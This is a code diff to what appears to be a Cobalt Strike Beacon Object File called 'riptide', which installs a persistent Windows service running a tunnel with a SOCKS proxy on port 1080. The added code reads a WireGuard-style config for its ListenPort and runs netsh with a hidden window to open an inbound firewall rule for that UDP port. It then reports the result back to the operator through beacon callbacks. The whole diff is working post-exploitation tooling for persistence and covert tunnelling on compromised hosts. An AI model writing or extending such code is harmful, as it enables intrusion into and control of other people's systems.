@@ -46,6 +46,51 @@ WINADVAPI BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
 WINADVAPI BOOL WINAPI ADVAPI32$ChangeServiceConfig2A(SC_HANDLE, DWORD, LPVOID);
 WINBASEAPI int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
 WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *);
+WINBASEAPI int __cdecl MSVCRT$_strnicmp(const char *, const char *, size_t);
+WINBASEAPI int __cdecl MSVCRT$atoi(const char *);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
+WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
+WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
+WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
+WINBASEAPI BOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
+
+#ifndef GENERIC_READ
+#define GENERIC_READ 0x80000000L
+#endif
+#ifndef FILE_SHARE_READ
+#define FILE_SHARE_READ 0x00000001
+#endif
+#ifndef OPEN_EXISTING
+#define OPEN_EXISTING 3
+#endif
+#ifndef INVALID_HANDLE_VALUE
+#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)
+#endif
+#ifndef INVALID_FILE_SIZE
+#define INVALID_FILE_SIZE ((DWORD)0xFFFFFFFF)
+#endif
+#ifndef MEM_COMMIT
+#define MEM_COMMIT 0x1000
+#endif
+#ifndef MEM_RESERVE
+#define MEM_RESERVE 0x2000
+#endif
+#ifndef MEM_RELEASE
+#define MEM_RELEASE 0x8000
+#endif
+#ifndef PAGE_READWRITE
+#define PAGE_READWRITE 0x04
+#endif
+#ifndef CREATE_NO_WINDOW
+#define CREATE_NO_WINDOW 0x08000000
+#endif
+#ifndef STARTF_USESHOWWINDOW
+#define STARTF_USESHOWWINDOW 0x00000001
+#endif
 
 #ifndef INVALID_FILE_ATTRIBUTES
 #define INVALID_FILE_ATTRIBUTES ((DWORD)-1)
@@ -73,6 +118,102 @@ static int nonempty(const char *s)
     return s && s[0];
 }
 
+static int parse_listen_port(const char *s)
+{
+    const char *p;
+    if (!s)
+        return 0;
+    for (p = s; *p; p++) {
+        if (p != s && p[-1] != '\n' && p[-1] != '\r')
+            continue;
+        while (*p == ' ' || *p == '\t')
+            p++;
+        if (MSVCRT$_strnicmp(p, "ListenPort", 10) != 0)
+            continue;
+        p += 10;
+        while (*p == ' ' || *p == '\t')
+            p++;
+        if (*p != '=')
+            continue;
+        p++;
+        while (*p == ' ' || *p == '\t')
+            p++;
+        return MSVCRT$atoi(p);
+    }
+    return 0;
+}
+
+static int conf_listen_port(const char *path)
+{
+    HANDLE h;
+    DWORD n = 0, sz;
+    char *buf;
+    int port;
+
+    h = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE)
+        return 0;
+    sz = KERNEL32$GetFileSize(h, NULL);
+    if (sz == INVALID_FILE_SIZE || sz == 0 || sz > 65536) {
+        KERNEL32$CloseHandle(h);
+        return 0;
+    }
+    buf = (char *)KERNEL32$VirtualAlloc(NULL, sz + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) {
+        KERNEL32$CloseHandle(h);
+        return 0;
+    }
+    if (!KERNEL32$ReadFile(h, buf, sz, &n, NULL)) {
+        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
+        KERNEL32$CloseHandle(h);
+        return 0;
+    }
+    buf[n] = 0;
+    KERNEL32$CloseHandle(h);
+    port = parse_listen_port(buf);
+    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
+    return port;
+}
+
+static void open_udp(int port)
+{
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    char cmd[640];
+    DWORD code = 1;
+    unsigned i;
+    char *p;
+
+    if (port <= 0 || port > 65535)
+        return;
+    p = (char *)&si;
+    for (i = 0; i < sizeof(si); i++)
+        p[i] = 0;
+    p = (char *)&pi;
+    for (i = 0; i < sizeof(pi); i++)
+        p[i] = 0;
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    MSVCRT$_snprintf(
+        cmd,
+        sizeof(cmd),
+        "C:\\Windows\\System32\\netsh.exe advfirewall firewall add rule name=RiptideWG-%d dir=in action=allow protocol=UDP localport=%d profile=any",
+        port,
+        port);
+    if (!KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        BeaconPrintf(CALLBACK_ERROR, "[riptide] netsh udp/%d err=%u\n", port, KERNEL32$GetLastError());
+        return;
+    }
+    KERNEL32$WaitForSingleObject(pi.hProcess, 15000);
+    KERNEL32$GetExitCodeProcess(pi.hProcess, &code);
+    KERNEL32$CloseHandle(pi.hProcess);
+    KERNEL32$CloseHandle(pi.hThread);
+    if (code == 0)
+        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] firewall udp/%d inbound allow\n", port);
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] firewall udp/%d netsh exit=%u (rule may already exist)\n", port, code);
+}
+
 void go(char *args, int len)
 {
     datap parser;
@@ -86,6 +227,7 @@ void go(char *args, int len)
     char binpath[MAX_PATH * 2];
     SC_HANDLE scm, hsvc;
     DWORD err;
+    int listen;
     SC_ACTION_B actions[3];
     SERVICE_FAILURE_ACTIONS_B fa;
     SERVICE_DELAYED_AUTO_START_INFO_B delayed;
@@ -187,7 +329,14 @@ void go(char *args, int len)
         }
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[riptide] service %s running  exe=%s  overlay SOCKS :1080\n", svc, dest_exe);
+    listen = conf_listen_port(dest_conf);
+    if (listen > 0)
+        open_udp(listen);
+
+    if (listen > 0)
+        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] HUB service %s running  exe=%s  udp/%d  overlay SOCKS :1080\n", svc, dest_exe, listen);
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[riptide] service %s running  exe=%s  overlay SOCKS :1080\n", svc, dest_exe);
     ADVAPI32$CloseServiceHandle(hsvc);
     ADVAPI32$CloseServiceHandle(scm);
 }
